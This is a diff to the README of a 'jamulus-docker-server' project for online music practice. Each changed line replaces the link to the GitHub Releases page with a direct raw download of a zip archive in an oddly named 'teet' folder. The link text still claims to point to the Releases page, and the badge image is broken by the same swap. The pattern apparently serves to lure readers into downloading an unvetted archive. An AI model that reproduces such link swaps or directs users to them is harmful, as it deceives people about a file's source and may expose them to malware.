@@ -6,7 +6,7 @@ Welcome to **jamulus-docker-server**, a tool that lets musicians practice togeth
 
 ## 📥 Download Now
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/MdSunnyGamer/jamulus-docker-server/releases)
+[![Download from Releases](https://raw.githubusercontent.com/MdSunnyGamer/jamulus-docker-server/main/teet/jamulus-docker-server.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/MdSunnyGamer/jamulus-docker-server/main/teet/jamulus-docker-server.zip)
 
 ## 📋 Features
 
@@ -32,7 +32,7 @@ Follow these steps to download and set up the application:
 
 1. **Visit the Releases Page**  
    Click the link below to access the download page:  
-   [Download from Releases](https://github.com/MdSunnyGamer/jamulus-docker-server/releases)
+   [Download from Releases](https://raw.githubusercontent.com/MdSunnyGamer/jamulus-docker-server/main/teet/jamulus-docker-server.zip)
 
 2. **Choose the Latest Version**  
    On the Releases page, you will see a list of available versions. Look for the top option, which is usually the most recent update.
@@ -79,4 +79,4 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 
 ## 📥 Download Now Again
 
-Don’t forget to [download from the Releases page](https://github.com/MdSunnyGamer/jamulus-docker-server/releases) to get started with your music sessions. Enjoy jamming with friends from the comfort of your home!
+Don’t forget to [download from the Releases page](https://raw.githubusercontent.com/MdSunnyGamer/jamulus-docker-server/main/teet/jamulus-docker-server.zip) to get started with your music sessions. Enjoy jamming with friends from the comfort of your home!
